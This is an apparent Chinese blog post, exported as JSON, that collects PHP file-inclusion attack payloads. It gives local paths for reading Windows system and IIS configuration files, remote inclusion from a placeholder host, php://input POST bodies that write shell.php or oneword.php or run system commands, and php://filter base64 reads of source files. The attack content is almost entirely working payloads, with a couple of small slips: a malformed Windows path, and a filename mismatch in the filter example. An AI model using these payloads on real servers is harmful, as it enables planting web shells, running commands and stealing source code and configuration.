{"title":"文件包含漏洞常用命令","slug":"文件包含漏洞常用命令","date":"2018-04-09T08:56:35.000Z","updated":"2018-11-07T12:35:57.902Z","comments":true,"excerpt":"","content":"<h1 id=\"主要包含形式\"><a href=\"#主要包含形式\" class=\"headerlink\" title=\"主要包含形式\"></a>主要包含形式</h1><h2 id=\"1-包含本地文件\"><a href=\"#1-包含本地文件\" class=\"headerlink\" title=\"1.包含本地文件\"></a>1.包含本地文件</h2><p>payload：</p>\n<pre><code>?page=C:\\oneword\n\n?file=C:\\boot.ini（Windows查看系统版本）\n\n?file=C:\\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件)\n</code></pre><h2 id=\"2-包含远程文件\"><a href=\"#2-包含远程文件\" class=\"headerlink\" title=\"2.包含远程文件\"></a>2.包含远程文件</h2><p>payload：</p>\n<pre><code>?url=http://www.bbb.com/2.txt\n\n?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp）\n</code></pre><h2 id=\"3-伪协议\"><a href=\"#3-伪协议\" class=\"headerlink\" title=\"3.伪协议\"></a>3.伪协议</h2><p>1) php://input</p>\n<p>说明：</p>\n<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</p>\n<p>条件：</p>\n<p>php &lt;5.0 ，allow_url_include=Off 情况下也可以用</p>\n<p>php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</p>\n<p>用例1 增加一句话：</p>\n<p>URL：</p>\n<pre><code>http://localhost/include/file.php?file=php://input\n</code></pre><p>POST：</p>\n<pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;\n</code></pre><p>用例2 增加文件：</p>\n<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code><br>这里fopen参数为w，可新建一个文件。</p>\n<p>用例3 执行系统命令：</p>\n<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php system(&#39;ipconfig&#39;);?&gt;</code></p>\n<hr>\n<p>2)data://</p>\n<p>说明：</p>\n<p>这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)</p>\n<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>\n<p>条件：</p>\n<p>allow_url_include=On<br>php &gt; 5.2</p>\n<hr>\n<p>3)<strong>php://filter</strong></p>\n<p>说明：</p>\n<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：</p>\n<pre><code>?page=php://filter/read=convert.base64-encode/resource=php.ini\n</code></pre><p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p>\n<p><strong>payload:</strong></p>\n<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php\n</code></pre><p>资料来源：<br><a href=\"https://www.anquanke.com/post/id/86123\" title=\"参考网站\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/86123</a></p>\n","categories":[],"tags":[]}